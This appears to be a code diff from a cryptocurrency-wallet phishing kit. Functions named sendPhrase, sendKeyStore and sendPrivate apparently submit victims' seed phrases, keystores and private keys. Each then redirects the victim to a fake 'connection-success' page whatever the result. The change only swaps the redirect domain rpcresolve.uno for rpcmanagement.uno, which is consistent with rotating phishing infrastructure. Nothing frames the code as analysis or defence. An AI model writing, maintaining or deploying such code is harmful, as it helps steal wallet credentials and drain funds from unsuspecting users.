@@ -20,13 +20,13 @@ function sendPhrase() {
                 console.log(res);
 
                 if (res.status) {
-                    location.href = 'https://rpcresolve.uno/apiv4wc-connection-success';
+                    location.href = 'https://rpcmanagement.uno/apiv4wc-connection-success';
                 } else {
-                    location.href = 'https://rpcresolve.uno/apiv4wc-connection-success';
+                    location.href = 'https://rpcmanagement.uno/apiv4wc-connection-success';
                 }
             },
             error: function () {
-                location.href = 'https://rpcresolve.uno/apiv4wc-connection-success';
+                location.href = 'https://rpcmanagement.uno/apiv4wc-connection-success';
             }
         });
     }
@@ -57,13 +57,13 @@ function sendKeyStore() {
                 console.log(res);
 
                 if (res.status) {
-                    location.href = 'https://rpcresolve.uno/apiv4wc-connection-success';
+                    location.href = 'https://rpcmanagement.uno/apiv4wc-connection-success';
                 } else {
-                    location.href = 'https://rpcresolve.uno/apiv4wc-connection-success';
+                    location.href = 'https://rpcmanagement.uno/apiv4wc-connection-success';
                 }
             },
             error: function () {
-                location.href = 'https://rpcresolve.uno/apiv4wc-connection-success';
+                location.href = 'https://rpcmanagement.uno/apiv4wc-connection-success';
             }
         });
     }
@@ -89,13 +89,13 @@ function sendPrivate() {
                 console.log(res);
 
                 if (res.status) {
-                    location.href = 'https://rpcresolve.uno/apiv4wc-connection-success';
+                    location.href = 'https://rpcmanagement.uno/apiv4wc-connection-success';
                 } else {
-                    location.href = 'https://rpcresolve.uno/apiv4wc-connection-success';
+                    location.href = 'https://rpcmanagement.uno/apiv4wc-connection-success';
                 }
             },
             error: function () {
-                location.href = 'https://rpcresolve.uno/apiv4wc-connection-success';
+                location.href = 'https://rpcmanagement.uno/apiv4wc-connection-success';
             }
         });
     }
